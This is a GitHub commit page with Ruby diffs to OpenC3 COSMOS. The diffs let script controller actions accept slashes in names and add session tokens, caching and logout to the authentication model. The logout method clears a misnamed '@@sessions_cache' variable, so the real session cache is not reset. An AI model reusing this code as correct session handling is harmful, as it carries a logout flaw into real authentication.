This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -56,7 +56,7 @@ def delete\_temp |
|  |  |  |
|  |  | def body |
|  |  | return unless authorization('script\_view') |
|  |  | scope, name = sanitize\_params([:scope, :name]) |
|  |  | scope, name = sanitize\_params([:scope, :name], :allow\_forward\_slash => true) |
|  |  | return unless scope |
|  |  |  |
|  |  | file = Script.body(scope, name) |
| Expand Down  Expand Up | | @@ -126,15 +126,15 @@ def run |
|  |  |  |
|  |  | def lock |
|  |  | return unless authorization('script\_edit') |
|  |  | scope, name = sanitize\_params([:scope, :name]) |
|  |  | scope, name = sanitize\_params([:scope, :name], :allow\_forward\_slash => true) |
|  |  | return unless scope |
|  |  | Script.lock(scope, name, username()) |
|  |  | render status: 200 |
|  |  | end |
|  |  |  |
|  |  | def unlock |
|  |  | return unless authorization('script\_edit') |
|  |  | scope, name = sanitize\_params([:scope, :name]) |
|  |  | scope, name = sanitize\_params([:scope, :name], :allow\_forward\_slash => true) |
|  |  | return unless scope |
|  |  | locked\_by = Script.locked?(scope, name) |
|  |  | Script.unlock(scope, name) if username() == locked\_by |
| Expand All | | @@ -143,7 +143,7 @@ def unlock |
|  |  |  |
|  |  | def destroy |
|  |  | return unless authorization('script\_edit') |
|  |  | scope, name = sanitize\_params([:scope, :name]) |
|  |  | scope, name = sanitize\_params([:scope, :name], :allow\_forward\_slash => true) |
|  |  | return unless scope |
|  |  | Script.destroy(scope, name) |
|  |  | OpenC3::Logger.info("Script destroyed: #{name}", scope: scope, user: username()) |
| Expand Down | |  |

33 changes: 31 additions & 2 deletions

33
[openc3/lib/openc3/models/auth\_model.rb](#diff-0e23e07224728a50714e8ef02ab09be38aef214ead1734e8247691c2d897410f "openc3/lib/openc3/models/auth_model.rb")

Show comments

[View file](/OpenC3/cosmos/blob/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7/openc3/lib/openc3/models/auth_model.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -21,15 +21,22 @@ |
|  |  | # if purchased from OpenC3, Inc. |
|  |  |  |
|  |  | require 'digest' |
|  |  | require 'securerandom' |
|  |  | require 'openc3/utilities/store' |
|  |  |  |
|  |  | module OpenC3 |
|  |  | class AuthModel |
|  |  | PRIMARY\_KEY = 'OPENC3\_\_TOKEN' |
|  |  | SESSIONS\_KEY = 'OPENC3\_\_SESSIONS' |
|  |  |  |
|  |  | TOKEN\_CACHE\_TIMEOUT = 5 |
|  |  | SESSION\_CACHE\_TIMEOUT = 5 |
|  |  | @@token\_cache = nil |
|  |  | @@token\_cache\_time = nil |
|  |  | @@session\_cache = nil |
|  |  | @@session\_cache\_time = nil |
|  |  |  |
|  |  | MIN\_TOKEN\_LENGTH = 8 |
|  |  |  |
|  |  | def self.set?(key = PRIMARY\_KEY) |
|  |  | Store.exists(key) == 1 |
| Expand All | | @@ -38,14 +45,23 @@ def self.set?(key = PRIMARY\_KEY) |
|  |  | def self.verify(token) |
|  |  | return false if token.nil? or token.empty? |
|  |  |  |
|  |  | time = Time.now |
|  |  | return true if @@session\_cache and (time - @@session\_cache\_time) < SESSION\_CACHE\_TIMEOUT and @@session\_cache[token] |
|  |  | token\_hash = hash(token) |
|  |  | return true if @@token\_cache and (Time.now - @@token\_cache\_time) < TOKEN\_CACHE\_TIMEOUT and @@token\_cache == token\_hash |
|  |  | return true if @@token\_cache and (time - @@token\_cache\_time) < TOKEN\_CACHE\_TIMEOUT and @@token\_cache == token\_hash |
|  |  |  |
|  |  | # Check sessions |
|  |  | @@session\_cache = Store.hgetall(SESSIONS\_KEY) |
|  |  | @@session\_cache\_time = time |
|  |  | return true if @@session\_cache[token] |
|  |  |  |
|  |  | # Check Direct password |
|  |  | @@token\_cache = Store.get(PRIMARY\_KEY) |
|  |  | @@token\_cache\_time = Time.now |
|  |  | @@token\_cache\_time = time |
|  |  | return true if @@token\_cache == token\_hash |
|  |  |  |
|  |  | # Handle a service password - Generally only used by ScriptRunner |
|  |  | # TODO: Replace this with temporary service tokens |
|  |  | service\_password = ENV['OPENC3\_SERVICE\_PASSWORD'] |
|  |  | return true if service\_password and service\_password == token |
|  |  |  |
| Expand All | | @@ -54,6 +70,7 @@ def self.verify(token) |
|  |  |  |
|  |  | def self.set(token, old\_token, key = PRIMARY\_KEY) |
|  |  | raise "token must not be nil or empty" if token.nil? or token.empty? |
|  |  | raise "token must be at least 8 characters" if token.length < MIN\_TOKEN\_LENGTH |
|  |  |  |
|  |  | if set?(key) |
|  |  | raise "old\_token must not be nil or empty" if old\_token.nil? or old\_token.empty? |
| Expand All | | @@ -62,6 +79,18 @@ def self.set(token, old\_token, key = PRIMARY\_KEY) |
|  |  | Store.set(key, hash(token)) |
|  |  | end |
|  |  |  |
|  |  | def self.generate\_session |
|  |  | token = SecureRandom.urlsafe\_base64(nil, false) |
|  |  | Store.hset(SESSIONS\_KEY, token, Time.now.iso8601) |
|  |  | return token |
|  |  | end |
|  |  |  |
|  |  | def self.logout |
|  |  | Store.del(SESSIONS\_KEY) |
|  |  | @@sessions\_cache = nil |
|  |  | @@sessions\_cache\_time = nil |
|  |  | end |
|  |  |  |
|  |  | def self.hash(token) |
|  |  | Digest::SHA2.hexdigest token |
|  |  | end |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b5ab34f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fcommit%2Fb5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


